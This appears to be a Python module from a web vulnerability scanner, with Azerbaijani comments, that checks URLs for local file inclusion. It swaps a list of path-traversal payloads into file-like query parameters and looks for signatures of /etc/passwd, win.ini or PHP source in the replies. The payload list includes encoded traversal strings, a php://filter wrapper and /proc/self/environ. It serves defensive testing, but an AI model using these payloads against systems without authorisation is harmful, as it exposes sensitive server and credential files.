"""
MODUL: LFI (Local File Inclusion) / Path Traversal
==================================================
Saytın ?file=, ?page= kimi parametrlərlə server fayllarını oxumağa
icazə verməsi = hücumçu /etc/passwd kimi həssas faylları oxuya bilər.

Zərərsiz: parametrə "../../../../etc/passwd" qoyub, cavabda Linux
parol faylının imzasını (root:x:) axtarır. Heç nə dəyişmir.
"""

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core import http_client

ƏLAMƏTLƏR = ("file", "page", "path", "doc", "document", "folder",
             "include", "inc", "template", "view", "load")
PAYLOADLAR = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",            # ikiqat kodlaşdırma
    "/etc/passwd%00",                                   # null bayt
    "....\\\\....\\\\....\\\\windows\\\\win.ini",       # Windows
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",  # PHP wrapper
    "/proc/self/environ",
    "file:///etc/passwd",
]
# Linux parol faylı + Windows win.ini + php base64 + proc env
IMZA = re.compile(
    r"root:.*:0:0:|\[fonts\]|\[extensions\]|\[mci extensions\]|"
    r"PD9waHA|<\?php|HTTP_USER_AGENT=|DOCUMENT_ROOT=", re.IGNORECASE)


def yoxla(parametrli_url, hesabat, timeout=8):
    for url in parametrli_url:
        parcalar = urlparse(url)
        parametrler = parse_qs(parcalar.query)
        for param in parametrler:
            if param.lower() not in ƏLAMƏTLƏR:
                continue
            for p in PAYLOADLAR:
                yeni = {k: v[0] for k, v in parametrler.items()}
                yeni[param] = p
                test_url = urlunparse(parcalar._replace(query=urlencode(yeni)))
                cavab = http_client.al(test_url, timeout=timeout)
                if cavab and IMZA.search(cavab.text or ""):
                    hesabat.elave_et("kritik", "lfi", test_url, param=param)
                    break
            else:
                continue
            break
